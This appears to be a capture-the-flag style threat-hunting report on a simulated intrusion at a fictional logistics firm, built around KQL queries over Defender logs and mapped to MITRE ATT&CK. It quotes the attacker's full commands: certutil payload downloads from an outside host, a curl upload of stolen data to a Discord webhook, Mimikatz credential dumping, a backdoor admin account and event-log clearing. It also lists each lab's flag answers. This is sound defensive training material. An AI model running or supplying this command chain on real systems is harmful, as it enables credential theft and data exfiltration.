# THE AZUKI BREACH SAGA - Part 1: Port of Entry

<img width="740" height="1110" alt="Screenshot 2026-01-10 at 8 24 11 PM" src="https://github.com/user-attachments/assets/6f69151b-e97b-4c41-8f8f-747a15b85ab9" />

## Executive Summary

This report documents the findings from a threat hunting investigation conducted on Azuki Import/Export Trading Co. following the discovery that proprietary supplier contracts and pricing data appeared on underground forums. A competitor subsequently undercut a 6-year shipping contract by exactly 3%, suggesting targeted corporate espionage.

The investigation identified an active intrusion by JADE SPIDER (also known as APT-SL44 or SilentLynx), a financially motivated threat actor known for targeting logistics companies in East Asia. The attacker gained initial access via Remote Desktop Protocol using compromised credentials, established persistence through scheduled tasks and a backdoor account, harvested credentials using Mimikatz, and exfiltrated data through Discord before attempting to cover their tracks by clearing Windows event logs.

---

## Scenario Overview

### Incident Brief

| Field | Detail |
|-------|--------|
| Company | Azuki Import/Export Trading Co. (梓貿易株式会社) |
| Industry | Shipping logistics, Japan/SE Asia |
| Employees | 23 |
| Situation | Competitor undercut 6-year shipping contract by exactly 3%; supplier contracts and pricing data appeared on underground forums |
| Compromised System | azuki-sl (IT admin workstation) |
| Evidence Available | Microsoft Defender for Endpoint logs (via Azure Log Analytics) |

### Threat Actor Profile

| Attribute | Detail |
|-----------|--------|
| Name | JADE SPIDER |
| Aliases | APT-SL44, SilentLynx |
| Active Since | 2019 |
| Motivation | Financial |
| Targets | Logistics companies, East Asia |
| Recent Activity | 30+ victims across Japan, South Korea, Taiwan, Singapore |
| Typical Dwell Time | 21-45 days |
| Last Observed | November 2025 |

### Known Behaviour

JADE SPIDER demonstrates the following operational characteristics:

- Gains access through common entry points
- Uses native Windows capabilities where possible (Living Off The Land)
- Focuses on credential theft and lateral movement
- Exfiltrates data before final impact
- Employs anti-forensic measures

### Primary Tactics

Initial Access → Persistence → Credential Access → Lateral Movement → Collection → Exfiltration → Impact

### Investigation Scope

| Parameter | Value |
|-----------|-------|
| Time Period | November 1 - November 22, 2025 |
| Active Attack Period | November 19 - November 22, 2025 |
| Target Device | azuki-sl |
| Data Source | Microsoft Defender for Endpoint logs (Azure Log Analytics) |

**Note:** This threat hunt was initiated on November 22, 2025, establishing the end date for the investigation scope. However, no relevant log activity was recorded prior to November 19, which marks the start of the active attack period.  

### Investigation Questions

1. What was the initial access method?
2. Which accounts were compromised?
3. What data was stolen?
4. What exfiltration method was used?
5. Does persistent access remain?

### Supporting Documents

- [Attack Timeline](https://github.com/moradiya-neel/threat-hunt-azuki-breach-saga/blob/main/part-1-port-of-entry/docs/chronological-timeline.md) - Chronological breakdown of attacker activity
- [Indicators of Compromise](https://github.com/moradiya-neel/threat-hunt-azuki-breach-saga/blob/main/part-1-port-of-entry/docs/indicators-of-compromise.md) - Complete IOCs list

---

## Findings

### Flag 1: Initial Access - Remote Access Source

**Objective:** Identify the external IP address used for the first unauthorized RDP connection.

**Query Used:**
```kql
DeviceLogonEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-01) .. datetime(2025-11-22))
| where AccountName !startswith "dwm" and AccountName !startswith "umfd" // filtering out system accounts
| where ActionType == "LogonSuccess"
| order by TimeGenerated asc
| project TimeGenerated, AccountName, ActionType, LogonType, RemoteIP
```
<img width="1200" alt="1" src="https://github.com/user-attachments/assets/30d29d94-f2be-4ae5-b530-700ec398f286" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 19, 2025, 6:36:18 PM |
| External IP | 88.97.178.12 |
| Account Used | kenji.sato |
| Logon Type | Network → RemoteInteractive |
| Target Device | azuki-sl |

**Analysis:**

The first unauthorized access to azuki-sl originated from external IP address 88.97.178.12. The attacker successfully authenticated using the kenji.sato account via RDP. This timestamp marks the beginning of the active intrusion on the IT admin workstation.

**MITRE ATT&CK Reference:**
- External Remote Services (T1133)
- Remote Services: Remote Desktop Protocol (T1021.001)

**Flag Answer:** `88.97.178.12`

---

### Flag 2: Initial Access - Compromised User Account

**Objective:** Identify the user account that was compromised for the initial unauthorized access.

**Query Used:**
```kql
DeviceLogonEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-22)) // as there is no activity before 19th on the account
| where ActionType == "LogonSuccess"
| where RemoteIP == "88.97.178.12"
| order by TimeGenerated asc
| project TimeGenerated, AccountName, ActionType, LogonType, RemoteIP
```
<img width="1200" alt="2" src="https://github.com/user-attachments/assets/2f261803-c77d-40d9-9ea5-58b8af1246e2" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 19, 2025, 6:36:18 PM |
| External IP | 88.97.178.12 |
| Compromised Account | kenji.sato |
| Logon Type | Network → RemoteInteractive |
| Target Device | azuki-sl |

**Analysis:**

The attacker used compromised credentials belonging to kenji.sato to gain initial access via RDP from external IP 88.97.178.12. Since azuki-sl is an IT admin workstation, this account likely has elevated privileges, making it a high-value target. This aligns with JADE SPIDER's known focus on credential theft and targeting privileged accounts.

**MITRE ATT&CK Reference:**
- Valid Accounts (T1078)

**Flag Answer:** `kenji.sato`

---

### Flag 3: Discovery - Network Reconnaissance

**Objective:** Identify the network reconnaissance command used to discover local network devices and hardware addresses.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-sl" and AccountName == "kenji.sato"
| where TimeGenerated >= todatetime('2025-11-19T18:36:18.503997Z') // timestamp - first successful logon
| where ProcessCommandLine has_any ("ipconfig", "arp", "net", "nbstat", "route", "ping")
| order by TimeGenerated asc
| project TimeGenerated, ActionType, FileName, FolderPath, ProcessCommandLine
```
<img width="1200" alt="3" src="https://github.com/user-attachments/assets/14258a6c-bf49-47d2-9d00-266b0e29c8cf" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 19, 2025, 7:04:01 PM |
| Command | "ARP.EXE" -a |
| Executable | ARP.EXE |
| Path | C:\Windows\System32\ARP.EXE |
| Account | kenji.sato |
| Device | azuki-sl |

**Analysis:**

Approximately 28 minutes after initial access, the attacker executed `"ARP.EXE" -a` to enumerate devices on the local network. This command reveals IP-to-MAC address mappings, allowing the attacker to identify potential lateral movement targets. This is a standard reconnaissance technique used to map network topology before pivoting to other systems.

**MITRE ATT&CK Reference:**
- System Network Configuration Discovery (T1016)

**Flag Answer:** `"ARP.EXE" -a`

---

### Flag 4: Defence Evasion - Malware Staging Directory

**Objective:** Identify the primary staging directory where the attacker stored malware and tools.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated >= todatetime('2025-11-19T18:36:18.503997Z') // timestamp - first successful logon
| where ProcessCommandLine has_any ("mkdir", "attrib", "md", "New-Item")
| order by TimeGenerated asc
| project TimeGenerated, AccountName, ActionType, FileName, FolderPath, ProcessCommandLine
```
<img width="1200" alt="4" src="https://github.com/user-attachments/assets/f8458cfe-cc25-47c9-a089-e263533c25b6" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 19, 2025, 7:05:33 PM |
| Command | attrib.exe +h +s C:\ProgramData\WindowsCache |
| Account | kenji.sato |
| Device | azuki-sl |
| Staging Directory | C:\ProgramData\WindowsCache |

**Analysis:**

The attacker created a staging directory at C:\ProgramData\WindowsCache and used the attrib command to hide it. The flags used were `+h` (Hidden attribute, not visible in normal directory listings) and `+s` (System attribute, adds extra protection and appears as a system folder). This location was strategically chosen because C:\ProgramData\ is a legitimate Windows folder, "WindowsCache" sounds like a legitimate system folder, and the Hidden + System attributes make it invisible to casual inspection.

**MITRE ATT&CK Reference:**
- Data Staged: Local Data Staging (T1074.001)
- Hide Artifacts: Hidden Files and Directories (T1564.001)

**Flag Answer:** `C:\ProgramData\WindowsCache`

---

### Flag 5: Defence Evasion - File Extension Exclusions

**Objective:** Count the number of file extension exclusions added to Windows Defender.

**Query Used:**
```kql
DeviceRegistryEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated >= todatetime('2025-11-19T18:36:18.503997Z')
| where RegistryKey contains "Extensions"
| order by TimeGenerated asc
| project TimeGenerated, ActionType, RegistryKey, RegistryValueName, RegistryValueData
```
<img width="1200" alt="5" src="https://github.com/user-attachments/assets/feefb97e-0c8f-4138-a82f-9bc18a535d29" />

**Finding:**

| Timestamp | Extension |
|-----------|-----------|
| Nov 19, 6:49:27 PM | .bat |
| Nov 19, 6:49:27 PM | .ps1 |
| Nov 19, 6:49:29 PM | .exe |

**Analysis:**

The attacker added three file extension exclusions to Windows Defender to prevent scanning of malicious files. The .bat extension allows batch scripts to execute, .ps1 allows PowerShell scripts, and .exe allows executables. These exclusions were added within 2 seconds, indicating an automated script was used to configure Defender evasion.

**MITRE ATT&CK Reference:**
- Impair Defenses: Disable or Modify Tools (T1562.001)

**Flag Answer:** `3`

---

### Flag 6: Defence Evasion - Temporary Folder Exclusion

**Objective:** Identify the temporary folder path excluded from Windows Defender scanning.

**Query Used:**
```kql
DeviceRegistryEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated >= todatetime('2025-11-19T18:36:18.503997Z')
| where RegistryKey contains "Exclusions\\Paths" \\ @"Exclusions\Paths"
| order by TimeGenerated asc
| project TimeGenerated, ActionType, RegistryKey, RegistryValueName, RegistryValueData
```
<img width="1200" alt="6" src="https://github.com/user-attachments/assets/d20847cf-8d16-49c9-9575-bac0804a89e8" />

**Finding:**

| Timestamp | Path Excluded |
|-----------|---------------|
| Nov 19, 6:49:27 PM | C:\Users\KENJI~1.SAT\AppData\Local\Temp |
| Nov 19, 6:49:27 PM | C:\ProgramData\WindowsCache |

**Analysis:**

The attacker added two folder path exclusions to Windows Defender. The first exclusion targeted the user's temporary folder `C:\Users\KENJI~1.SAT\AppData\Local\Temp`, which is commonly used by attackers as a download location for malicious tools because users have write permissions, temporary files are often overlooked during security reviews, and many legitimate applications use this location. The second exclusion targeted the attacker's staging directory `C:\ProgramData\WindowsCache`, ensuring that all malware and tools stored there would evade Defender scanning. By excluding both paths, the attacker created safe zones for downloading, staging, and executing malicious payloads without triggering antivirus alerts.

**MITRE ATT&CK Reference:**
- Impair Defenses: Disable or Modify Tools (T1562.001)

**Flag Answer:** `C:\Users\KENJI~1.SAT\AppData\Local\Temp`

---

### Flag 7: Defence Evasion - Download Utility Abuse

**Objective:** Identify the Windows-native binary abused by the attacker to download files.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-sl" and AccountName == "kenji.sato"
| where TimeGenerated >= todatetime('2025-11-19T18:36:18.503997Z')
| where ProcessCommandLine has_any ("http://", "https://")
| order by TimeGenerated asc
| project TimeGenerated, AccountName, ActionType, FileName, FolderPath, ProcessCommandLine
```
<img width="1200" alt="7" src="https://github.com/user-attachments/assets/3ec76184-aea6-496f-9113-9b92eab5c7f1" />

**Finding:**

| Timestamp | Command |
|-----------|---------|
| Nov 19, 7:06:58 PM | certutil.exe -urlcache -f http://78.141.196.6:8080/svchost.exe C:\ProgramData\WindowsCache\svchost.exe |
| Nov 19, 7:07:21 PM | certutil.exe -urlcache -f http://78.141.196.6:8080/AdobeGC.exe C:\ProgramData\WindowsCache\mm.exe |

**Analysis:**

The attacker abused `certutil.exe`, a legitimate Windows certificate utility, to download malicious files from an attacker-controlled server. This is a classic `"Living Off The Land"` technique because `certutil.exe` is digitally signed by Microsoft, present on all Windows systems, bypasses application whitelisting, and security tools may not flag its network activity.

**Files Downloaded via Certutil:**

| Remote File | Local Path | Purpose (Likely) |
|-------------|------------|---------|
| svchost.exe | C:\ProgramData\WindowsCache\svchost.exe | Malware disguised as system process |
| AdobeGC.exe | C:\ProgramData\WindowsCache\mm.exe | Credential theft tool (Mimikatz) |

*Note: Additional commands involving URL-based activity were observed before and after the certutil.exe usage, which are documented in subsequent flags.*

**MITRE ATT&CK Reference:**
- Ingress Tool Transfer (T1105)
- System Binary Proxy Execution (T1218)

**Flag Answer:** `certutil.exe`

---

### Flag 8: Persistence - Scheduled Task Name

**Objective:** Identify the scheduled task created by the attacker for persistence.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-sl" and AccountName == "kenji.sato"
| where TimeGenerated >= todatetime('2025-11-19T18:36:18.503997Z')
| where ProcessCommandLine has_any ("/create", "schtasks")
| order by TimeGenerated asc
| project TimeGenerated, ActionType, FileName, FolderPath, ProcessCommandLine
```
<img width="1200" alt="8 9" src="https://github.com/user-attachments/assets/9af26dde-e769-41a7-80be-0d29fbf1ca01" />

**Finding:**

| Timestamp | Command |
|-----------|---------|
| Nov 19, 7:07:46 PM | schtasks.exe /create /tn "Windows Update Check" /tr C:\ProgramData\WindowsCache\svchost.exe /sc daily /st 02:00 /ru SYSTEM /f |
| Nov 19, 7:07:52 PM | schtasks.exe /query /tn "Windows Update Check" |

**Analysis:**

The attacker created a scheduled task named "Windows Update Check" to maintain persistence on the compromised system. The task was configured to run the malicious svchost.exe from the staging directory daily at 2:00 AM with SYSTEM privileges. The name was chosen to blend in with legitimate Windows maintenance tasks. The attacker then queried the task to verify it was created successfully, demonstrating operational discipline.

| Task Parameter | Value |
|----------------|-------|
| Task Name | Windows Update Check |
| Executable | C:\ProgramData\WindowsCache\svchost.exe |
| Schedule | Daily at 2:00 AM |
| Run As | SYSTEM |

**MITRE ATT&CK Reference:**
- Scheduled Task/Job: Scheduled Task (T1053.005)
- Masquerading: Match Legitimate Name or Location (T1036.005)

**Flag Answer:** `Windows Update Check`

---

### Flag 9: Persistence - Scheduled Task Target

**Objective:** Identify the executable path configured in the scheduled task for persistence.

**Reference:** This finding was derived from the same query results as Flag 8.

<img width="1200" alt="8 9" src="https://github.com/user-attachments/assets/fc4d16cf-fab7-4ed4-96c9-05539442418b" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 19, 2025, 7:07:46 PM |
| Full Command | schtasks.exe /create /tn "Windows Update Check" /tr C:\ProgramData\WindowsCache\svchost.exe /sc daily /st 02:00 /ru SYSTEM /f |
| Task Action (/tr) | C:\ProgramData\WindowsCache\svchost.exe |

**Analysis:**

The scheduled task was configured to execute `svchost.exe` from the attacker's staging directory. This is the same malicious file downloaded earlier via `certutil.exe` from the attacker-controlled server. By naming the malware `svchost.exe` and placing it in a hidden directory, the attacker attempted to disguise it as a legitimate Windows system process.

**MITRE ATT&CK Reference:**
- Scheduled Task/Job: Scheduled Task (T1053.005)
- Masquerading: Match Legitimate Name or Location (T1036.005)

**Flag Answer:** `C:\ProgramData\WindowsCache\svchost.exe`

---

### Flag 10: Command & Control - C2 Server Address

**Objective:** Identify the IP address of the command and control server.

**Query Used:**
```kql
DeviceNetworkEvents // all the conditions below are used based on flag 7 results
| where DeviceName == "azuki-sl" and InitiatingProcessAccountName == "kenji.sato"
| where TimeGenerated >= todatetime('2025-11-19T19:06:58.5778439Z')
| where InitiatingProcessFileName has_any ("svchost.exe", "mm.exe") and InitiatingProcessFolderPath contains "WindowsCache"
| order by TimeGenerated asc 
| project TimeGenerated, ActionType, InitiatingProcessCommandLine, InitiatingProcessFileName, InitiatingProcessFolderPath, RemoteIP, RemotePort
```
<img width="1200" alt="10 11" src="https://github.com/user-attachments/assets/c328b0fc-af9d-407b-bc8c-c2c882605bda" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 19, 2025, 7:11:04 PM |
| Source Process | svchost.exe |
| Process Path | C:\ProgramData\WindowsCache\svchost.exe |
| Remote IP | 78.141.196.6 |
| Remote Port | 443 |
| Connection Status | ConnectionSuccess |

**Analysis:**

The malicious executable `svchost.exe` initiated a successful outbound connection to `78.141.196.6` on port `443 (HTTPS)`. This is the same IP address from which the malware was originally downloaded, confirming it serves as both a malware staging server (hosting the malicious payloads) and a command and control server (receiving connections from infected hosts). The use of port `443` is a common technique to blend C2 traffic with legitimate HTTPS traffic, making it harder to detect via network monitoring.

**MITRE ATT&CK Reference:**
- Command and Control (TA0011)
- Application Layer Protocol: Web Protocols (T1071.001)

**Flag Answer:** `78.141.196.6`

---

### Flag 11: Command & Control - C2 Communication Port

**Objective:** Identify the destination port used for command and control communications.

**Reference:** This finding was derived from the same query results as Flag 10.

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 19, 2025, 7:11:04 PM |
| Remote IP | 78.141.196.6 |
| Remote Port | 443 |
| Protocol | HTTPS |

**Analysis:**

The malware communicates with the C2 server over port `443`, the standard HTTPS port. This is a deliberate evasion technique because port `443` traffic is expected on corporate networks, encrypted by default, often allowed through firewalls without inspection, and difficult to distinguish from legitimate web traffic. This technique is commonly used by advanced threat actors to avoid detection by blending malicious traffic with normal business operations.

**MITRE ATT&CK Reference:**
- Application Layer Protocol: Web Protocols (T1071.001)

**Flag Answer:** `443`

---

### Flag 12: Credential Access - Credential Theft Tool

**Objective:** Identify the filename of the credential dumping tool used by the attacker.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-sl" and AccountName == "kenji.sato"
| where TimeGenerated >= todatetime('2025-11-19T18:36:18.503997Z')
| where ProcessCommandLine has_any ("sekurlsa", "lsass", "logonpasswords")
| order by TimeGenerated asc
| project TimeGenerated, ActionType, FileName, FolderPath, ProcessCommandLine
```
<img width="1200" alt="12 13" src="https://github.com/user-attachments/assets/8f84c1e2-1d66-4535-ac4a-10e0a896348f" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 19, 2025, 7:08:26 PM |
| Filename | mm.exe |
| Path | C:\ProgramData\WindowsCache\mm.exe |
| Command | mm.exe privilege::debug sekurlsa::logonpasswords exit |

**Analysis:**

The attacker executed mm.exe with command-line arguments that confirm it is Mimikatz, a well-known credential dumping tool. The command breakdown shows that `privilege::debug` enables debug privileges required to access LSASS memory, `sekurlsa::logonpasswords` extracts plaintext passwords, hashes, and Kerberos tickets from LSASS, and `exit` closes the tool after execution. This explains why the attacker renamed the original file from AdobeGC.exe to mm.exe and added a Defender exclusion for it. The short filename "mm" is a common abbreviation for Mimikatz used by attackers to avoid detection.

**MITRE ATT&CK Reference:**
- OS Credential Dumping: LSASS Memory (T1003.001)

**Flag Answer:** `mm.exe`

---

### Flag 13: Credential Access - Memory Extraction Module

**Objective:** Identify the Mimikatz module used to extract logon passwords from memory.

**Reference:** This finding was derived from the same query results as Flag 12.

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 19, 2025, 7:08:26 PM |
| Full Command | mm.exe privilege::debug sekurlsa::logonpasswords exit |
| Module Used | sekurlsa::logonpasswords |

**Analysis:**

The attacker used the `sekurlsa::logonpasswords` module to extract credentials from LSASS memory. This is one of the most commonly used Mimikatz modules because it retrieves plaintext passwords (if available), NTLM password hashes, and Kerberos tickets for all logged-on users. The extracted credentials likely enabled the attacker to access additional accounts and move laterally within the network.

**MITRE ATT&CK Reference:**
- OS Credential Dumping: LSASS Memory (T1003.001)

**Flag Answer:** `sekurlsa::logonpasswords`

---

### Flag 14: Collection - Data Staging Archive

**Objective:** Identify the compressed archive filename used for data exfiltration.

**Query Used:**
```kql
DeviceFileEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated >= todatetime('2025-11-19T18:36:18.503997Z')
| where FileName endswith ".zip" and FolderPath contains "WindowsCache"
| order by TimeGenerated asc
| project TimeGenerated, ActionType, FileName, FolderPath, InitiatingProcessFileName
```
<img width="1200" alt="14" src="https://github.com/user-attachments/assets/e737bcdf-4e35-4c03-a1c1-8c49c95b2777" />

**Finding:**

| Field | Value |
|-------|-------|
| Filename | export-data.zip |
| Path | C:\ProgramData\WindowsCache\export-data.zip |

**Analysis:**

The attacker created a compressed archive named `export-data.zip` in the staging directory. This file was used to package stolen data for exfiltration. The descriptive filename "export-data" suggests the attacker organized the collected information before transferring it out of the network.

**MITRE ATT&CK Reference:**
- Archive Collected Data: Archive via Utility (T1560.001)

**Flag Answer:** `export-data.zip`

---

### Flag 15: Exfiltration - Exfiltration Channel

**Objective:** Identify the cloud service used to exfiltrate stolen data.

**Reference:** This finding was derived from the same query results as Flag 7 (while looking for URL-related commands).

<img width="1200" alt="7" src="https://github.com/user-attachments/assets/7d4e9fe3-7ee2-48f8-a543-7ed7ba32f1e7" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 19, 2025, 7:09:21 PM |
| Command | curl.exe -F file=@C:\ProgramData\WindowsCache\export-data.zip https://discord.com/api/webhooks/... |
| Exfiltration Service | Discord |

**Analysis:**

The attacker abused Discord's webhook functionality to exfiltrate the stolen data archive. Discord webhooks are commonly abused by threat actors for data exfiltration because they allow anonymous file uploads without authentication, the service is widely permitted through corporate firewalls, HTTPS encryption masks the data transfer, and uploaded files can be easily retrieved by the attacker later. The use of `curl.exe` with the `-F` parameter indicates a file upload operation to the Discord webhook URL.

**MITRE ATT&CK Reference:**
- Exfiltration Over Web Service (T1567)

**Flag Answer:** `Discord`

---

### Flag 16: Anti-Forensics - Log Tampering

**Objective:** Identify the first Windows event log cleared by the attacker.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-sl" and AccountName == "kenji.sato"
| where TimeGenerated >= todatetime('2025-11-19T18:36:18.503997Z')
| where ProcessCommandLine has_any ("wevtutil", "Remove-EventLog")
| order by TimeGenerated asc
| project TimeGenerated, ActionType, FileName, FolderPath, ProcessCommandLine
```
<img width="1200" alt="16" src="https://github.com/user-attachments/assets/f4bc180e-8eba-4e74-b75a-d199c750eef1" />

**Finding:**

| Timestamp | Command | Log Cleared |
|-----------|---------|-------------|
| Nov 19, 7:11:39 PM | wevtutil.exe cl Security | Security (First) |
| Nov 19, 7:11:43 PM | wevtutil.exe cl System | System (Second) |
| Nov 19, 7:11:46 PM | wevtutil.exe cl Application | Application (Third) |

**Analysis:**

The attacker systematically cleared three Windows event logs within a 7-second window, starting with the Security log. The order of clearing is significant: the Security log was targeted first because it contains the most valuable forensic evidence including logon events, privilege usage, and security policy changes. By clearing these logs, the attacker attempted to remove evidence of their RDP access, credential theft, and lateral movement activities. This anti-forensic technique demonstrates operational awareness and intent to hinder incident response efforts.

**MITRE ATT&CK Reference:**
- Indicator Removal: Clear Windows Event Logs (T1070.001)

**Flag Answer:** `Security`

---

### Flag 17: Impact - Persistence Account

**Objective:** Identify the backdoor account created by the attacker for persistent access.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-sl" and AccountName == "kenji.sato"
| where TimeGenerated >= todatetime('2025-11-19T18:36:18.503997Z')
| where ProcessCommandLine has_any ("net", "/add")
| order by TimeGenerated asc
| project TimeGenerated, ActionType, FileName, FolderPath, ProcessCommandLine
```
<img width="1200" alt="17" src="https://github.com/user-attachments/assets/e1934743-551c-4fc3-a7b7-80903270ed2a" />

**Finding:**

| Timestamp | Command | Action |
|-----------|---------|--------|
| Nov 19, 7:09:48 PM | net.exe user support ********** /add | Account created |
| Nov 19, 7:09:53 PM | net.exe localgroup Administrators support /add | Added to Administrators group |
| Nov 19, 7:09:57 PM | net.exe user support | Account verification |

**Analysis:**

The attacker created a local account named "support" and immediately elevated it to the local Administrators group. This backdoor account provides an alternative access method if the compromised kenji.sato credentials are reset or disabled. The username "support" was deliberately chosen to blend in with legitimate IT-related accounts and avoid suspicion during casual review. The attacker also verified the account creation was successful by running `net user support` to check the account details.

**MITRE ATT&CK Reference:**
- Create Account: Local Account (T1136.001)
- Account Manipulation (T1098)

**Flag Answer:** `support`

---

### Flag 18: Execution - Malicious Script

**Objective:** Identify the PowerShell script file used to automate the attack chain.

**Reference:** This finding was derived from the same query results as Flag 7.

<img width="1200" alt="Screenshot 2026-01-08 at 7 46 47 PM" src="https://github.com/user-attachments/assets/41670991-c0d2-4407-9e98-0ccf1ba621d4" />

**Alternative Query:**
```kql
DeviceFileEvents
| where DeviceName == "azuki-sl" and InitiatingProcessAccountName == "kenji.sato"
| where TimeGenerated >= todatetime('2025-11-19T18:36:18.503997Z')
| where FileName endswith ".ps1" or FileName endswith ".bat"
| where FolderPath contains "Temp"
| order by TimeGenerated asc
| project TimeGenerated, ActionType, FileName, FolderPath, InitiatingProcessCommandLine
```

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 19, 2025, 6:37:40 PM |
| Filename | wupdate.ps1 |
| Download Location | C:\Users\KENJI~1.SAT\AppData\Local\Temp\ |
| Source | http://78.141.196.6:8080/wupdate.ps1 |

**Analysis:**

The attacker downloaded and executed a PowerShell script named wupdate.ps1 from the C2 server. The filename was crafted to appear as a legitimate Windows Update script, using the "wupdate" prefix to blend with normal system activity. The script was executed with the `-ExecutionPolicy Bypass` and `-WindowStyle Hidden` parameters to evade security controls and hide the execution window from the user. This script served as the primary automation mechanism for the attack chain, likely orchestrating the subsequent activities including Defender exclusions, malware downloads, credential theft, and data exfiltration.

**MITRE ATT&CK Reference:**
- Command and Scripting Interpreter: PowerShell (T1059.001)

**Flag Answer:** `wupdate.ps1`

---

### Flag 19: Lateral Movement - Secondary Target

**Objective:** Identify the IP address targeted for lateral movement.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-sl" and AccountName == "kenji.sato"
| where TimeGenerated >= todatetime('2025-11-19T18:36:18.503997Z')
| where ProcessCommandLine has_any ("mstsc", "cmdkey")
| order by TimeGenerated asc
| project TimeGenerated, ActionType, FileName, FolderPath, ProcessCommandLine
```
<img width="1200" alt="19 20" src="https://github.com/user-attachments/assets/dc37edf9-b04e-402e-bc3a-f91ed8e727d4" />

**Finding:**

| Timestamp | Command | Purpose |
|-----------|---------|---------|
| Nov 19, 7:05:11 PM | cmdkey.exe /list | Enumerate stored credentials |
| Nov 19, 7:10:37 PM | cmdkey.exe /generic:10.1.0.188 /user:fileadmin /pass:***** | Store credentials for target |
| Nov 19, 7:10:41 PM | mstsc.exe /v:10.1.0.188 | RDP connection to target |

**Analysis:**

The attacker targeted internal IP address `10.1.0.188` for lateral movement. The attack sequence shows a methodical approach: the attacker first enumerated existing stored credentials using `cmdkey /list`, then stored the fileadmin account credentials for the target system, and finally initiated an RDP connection using `mstsc.exe`. The use of `cmdkey.exe` to store credentials before RDP connection allows for seamless authentication without interactive password prompts, enabling automated or scripted lateral movement. The fileadmin credentials were likely obtained through the Mimikatz credential dump.

**MITRE ATT&CK Reference:**
- Remote Services: Remote Desktop Protocol (T1021.001)
- Use Alternate Authentication Material (T1550)

**Flag Answer:** `10.1.0.188`

---

### Flag 20: Lateral Movement - Remote Access Tool

**Objective:** Identify the remote access tool used for lateral movement.

**Reference:** This finding was derived from the same query results as Flag 19.

<img width="1200" alt="19 20" src="https://github.com/user-attachments/assets/b1eae55b-af8a-4515-bd15-48fce349ca14" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 19, 2025, 7:10:41 PM |
| Executable | mstsc.exe |
| Path | C:\Windows\System32\mstsc.exe |
| Command | mstsc.exe /v:10.1.0.188 |

**Analysis:**

The attacker used mstsc.exe, the native Windows Remote Desktop Client, to initiate lateral movement to the target system at `10.1.0.188`. This is a `"living off the land"` technique where attackers leverage built-in system tools rather than custom malware. Using mstsc.exe for lateral movement is advantageous for attackers because it is a legitimate, Microsoft-signed binary present on all Windows systems, generates traffic indistinguishable from normal administrative activity, and is unlikely to trigger security alerts based on process execution alone.

**MITRE ATT&CK Reference:**
- Remote Services: Remote Desktop Protocol (T1021.001)

**Flag Answer:** `mstsc.exe`

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence |
|--------|-----------|-----|----------|
| Initial Access | External Remote Services | T1133 | RDP from 88.97.178.12 |
| Initial Access | Valid Accounts | T1078 | kenji.sato credentials |
| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 | wupdate.ps1 execution |
| Persistence | Scheduled Task/Job: Scheduled Task | T1053.005 | "Windows Update Check" task |
| Persistence | Create Account: Local Account | T1136.001 | "support" account |
| Defence Evasion | Impair Defenses: Disable or Modify Tools | T1562.001 | Defender exclusions |
| Defence Evasion | Hide Artifacts: Hidden Files and Directories | T1564.001 | Hidden staging directory |
| Defence Evasion | Masquerading: Match Legitimate Name or Location | T1036.005 | svchost.exe in WindowsCache |
| Defence Evasion | Indicator Removal: Clear Windows Event Logs | T1070.001 | wevtutil.exe log clearing |
| Defence Evasion | System Binary Proxy Execution | T1218 | certutil.exe abuse |
| Credential Access | OS Credential Dumping: LSASS Memory | T1003.001 | Mimikatz (mm.exe) |
| Discovery | System Network Configuration Discovery | T1016 | "ARP.EXE" -a command |
| Lateral Movement | Remote Services: Remote Desktop Protocol | T1021.001 | mstsc.exe to 10.1.0.188 |
| Lateral Movement | Use Alternate Authentication Material | T1550 | cmdkey credential storage |
| Collection | Archive Collected Data: Archive via Utility | T1560.001 | export-data.zip |
| Collection | Data Staged: Local Data Staging | T1074.001 | WindowsCache directory |
| Command and Control | Application Layer Protocol: Web Protocols | T1071.001 | HTTPS on port 443 |
| Exfiltration | Exfiltration Over Web Service | T1567 | Discord webhook |
| Ingress Tool Transfer | Ingress Tool Transfer | T1105 | certutil downloads |

---

## Recommendations

### Immediate Actions

1. **Disable compromised accounts** - Immediately disable the kenji.sato account and reset all passwords. Also remove the "support" backdoor account.

2. **Isolate affected systems** - Quarantine azuki-sl and investigate 10.1.0.188 for signs of compromise.

3. **Block malicious infrastructure** - Add the following to firewall blocklists:
   - 88.97.178.12 (Initial access IP)
   - 78.141.196.6 (C2 server)
   - Discord webhook URLs at the network perimeter

4. **Remove persistence mechanisms** - Delete the "Windows Update Check" scheduled task and remove all files from C:\ProgramData\WindowsCache\.

5. **Credential reset** - Force password reset for all accounts, particularly those with administrative privileges.

### Long-term Improvements

1. **Implement MFA** - Require multi-factor authentication for all remote access, especially RDP.

2. **Restrict RDP access** - Limit RDP to authorized IP ranges and implement a VPN requirement for remote access.

3. **Application whitelisting** - Block or alert on suspicious use of certutil.exe, wevtutil.exe, and other commonly abused LOLBins.

4. **Enhanced logging** - Ensure event logs are forwarded to a SIEM before they can be cleared locally.

5. **Defender hardening** - Implement tamper protection to prevent attackers from adding exclusions.

